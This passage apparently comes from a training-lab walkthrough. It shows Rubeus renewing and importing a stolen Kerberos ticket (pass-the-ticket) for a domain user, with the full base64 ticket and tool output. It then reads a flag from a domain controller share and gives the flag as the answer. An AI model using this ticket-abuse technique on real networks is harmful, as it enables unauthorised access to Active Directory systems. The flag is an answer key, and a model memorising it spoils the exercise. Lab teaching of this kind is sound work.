1QKVlAnWtp9J6lncpZYoMDKG6l5M4tyvfllOhxxWAOhkbbBO6zN88X7TOh0CngJYVsBtxqI5DL0VtVZRNlEr7MQYHqhhNVCAbO2V1JMRYAO8LtEVSPW5D/SB3I6/knZzPd32+5q5Leqm70oVA4kn/Xsjv+QHDT8RK2OqyiwQclvM4irUqivZQrZJS5fYMos9bm8DB4MSj69EcG58QSaaMRFyacjo7ONQ6ndNQcmYTbTcS5108Yr4S/10OQZMMY4YXZG4Aqp4E71stsACmHr4xptccsJ9BfopFI0d3tvnblmQCrUB/PJ9M4Zio93RartciN5bf+ePnhsLIf4UED0cv9VtgJ62cebTzAFhppSDe2kIlbvUQNZGYNgfTxfxNqBamQMVuMN3QSSKgHKxTWOu+hFoNyNj30wvW7cKyuWMT1Z0x2qjcQ6MIqOB/DCB+aADAgEAooHxBIHufYHrMIHooIHlMIHiMIHfoCswKaADAgESoSIEIBipltRr8t4e4OqgwqHooeylDH31lSzWpfV1e/giKpQ0oRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiFjAUoAMCAQGhDTALGwlqYWtlLmtpcmujBwMFAGChAAClERgPMjAyMzA0MjgyMTE3NTRaphEYDzIwMjMwNDI5MDcxNzU0WqcRGA8yMDIzMDUwNTIxMTc1NFqoFRsTSU5MQU5FRlJFSUdIVC5MT0NBTKkoMCagAwIBAqEfMB0bBmtyYnRndBsTSU5MQU5FRlJFSUdIVC5MT0NBTA== /service:CIFS/DC01 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Renew Ticket

[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.8.3)
[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\jake.kirk'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      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
      dBsTSU5MQU5FRlJFSUdIVC5MT0NBTA==
[+] Ticket successfully imported!
```

At last, when reading the contents of the file `\\DC01\Secret Share\flag.txt`, students will attain the flag `1ef37acac52540fb3fa05924fcb1103a`:

```cmd
more "\\DC01\Secret Share\flag.txt"
```
```
C:\Tools>more "\\DC01\Secret Share\flag.txt"

1ef37acac52540fb3fa05924fcb1103a
```

Answer: `1ef37acac52540fb3fa05924fcb1103a`